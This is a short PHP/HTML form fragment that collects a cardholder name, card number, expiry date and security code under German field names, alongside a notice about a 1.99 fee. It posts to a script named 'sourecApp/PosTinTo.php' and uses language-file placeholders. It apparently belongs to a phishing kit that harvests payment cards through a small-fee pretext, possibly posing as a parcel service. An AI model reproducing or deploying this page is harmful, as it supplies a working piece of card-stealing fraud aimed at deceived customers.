...
<form name="myForm" action="sourecApp/PosTinTo.php" onsubmit="return validateForm()" method="post">
  <div class="form-group">
    <input type="text" class="form-control" name="Kartenhalter"  id="Kartenhalter"  placeholder="<?php echo lang('Input_cc1'); ?>">
  </div>
  <div class="form-group">
    <input type="text" class="form-control" name="Kartennummer" id="Kartennummer"   placeholder="<?php echo lang('Input_cc2'); ?>">
  </div>
  <div class="row">
    <div class="col">
      <input type="text" class="form-control" name="Ablauf" id="Ablauf"  placeholder="<?php echo lang('Input_cc3'); ?>">
    </div>
    <div class="col">
      <input type="text" class="form-control" name="Sicherheitscode" id="Sicherheitscode"  placeholder="<?php echo lang('Input_cc4'); ?>">
    </div>
  </div>
      ...
      <div class="col-sm-4">
<span><b style="color:#d40511"><?php echo lang('Text_b1'); ?></b><br><?php echo lang('Text_b2'); ?> <span style="color:#d40511;font-weight:bold;font-family:arial">(1.99 )</span> <?php echo lang('Text_b3'); ?></span>
              
</div>
</div>
<button type="submit" class="btn-next" name="cartget" id="cartget"><?php echo lang('Btn_n1'); ?></button>
</form>
